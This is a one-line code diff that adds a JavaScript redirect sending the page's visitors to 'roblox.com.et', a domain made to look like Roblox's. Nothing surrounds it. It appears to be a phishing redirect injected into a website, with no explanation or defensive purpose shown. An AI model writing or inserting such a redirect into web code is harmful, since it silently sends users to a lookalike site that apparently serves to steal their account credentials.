@@ -1,0 +1,1 @@
+window.location.href = "https://www.roblox.com.et/users/9938391744/profile";
